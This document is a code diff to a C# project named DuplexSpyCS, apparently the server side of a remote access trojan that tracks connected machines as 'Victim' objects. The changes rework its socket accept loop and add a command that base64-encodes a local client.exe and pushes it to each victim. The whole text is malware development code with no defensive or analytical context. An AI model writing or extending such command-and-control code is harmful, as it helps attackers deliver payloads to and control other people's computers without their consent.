@@ -184,6 +184,7 @@ namespace DuplexSpyCS
             try
             {
                 Socket client = handler.EndAccept(ar);
+                handler.BeginAccept(new AsyncCallback(AcceptCallBack), handler);
                 if (l_victim.Select(x => x.socket.RemoteEndPoint.ToString().Split(':')[0]).ToArray().Contains(client.RemoteEndPoint.ToString().Split(':')[0]))
                 {
                     client.Disconnect(true);
@@ -191,8 +192,7 @@ namespace DuplexSpyCS
                 }
                 Victim v = new Victim(client);
                 v.ID = client.RemoteEndPoint.ToString();
-                handler.BeginAccept(new AsyncCallback(AcceptCallBack), handler);
-                v.socket.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallBack), v);
+                client.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallBack), v);
             }
             catch (Exception ex)
             {
@@ -327,9 +327,13 @@ namespace DuplexSpyCS
                                     }).Start();
                                 }
                             }
-                            else if (dsp.Command == 3)
+                            else if (dsp.Command == 3) //winClient48Small
                             {
+                                string szClient = "client.exe";
+                                if (!File.Exists(szClient))
+                                    return;
 
+                                v.SendCommand("init|" + Convert.ToBase64String(File.ReadAllBytes(szClient)));
                             }
                         }
                     }
